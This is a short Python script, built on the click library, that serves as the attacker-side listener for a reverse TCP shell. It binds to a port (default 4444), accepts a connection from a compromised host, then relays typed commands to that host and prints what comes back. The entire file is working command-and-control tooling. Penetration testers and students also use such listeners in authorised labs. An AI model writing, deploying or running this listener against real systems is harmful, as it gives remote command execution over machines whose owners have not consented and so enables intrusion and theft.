import socket
import click


@click.command(help='Create a listener for a reverse tcp shell')
@click.option('--host', default='0.0.0.0', help='the IP to bind the server to')
@click.option('--port', default=4444, help='the port to list on')
def connect(host, port):
    s = socket.socket()
    s.bind((host, port))
    s.listen(1)
    print('[*] TCP Reverse Shell listening on',host, port)
    conn, addr = s.accept()
    print('[+] we got a connection from', addr)

    while True:
        command = input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break;
        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode())

    conn.close()


if __name__ == '__main__':
    connect()

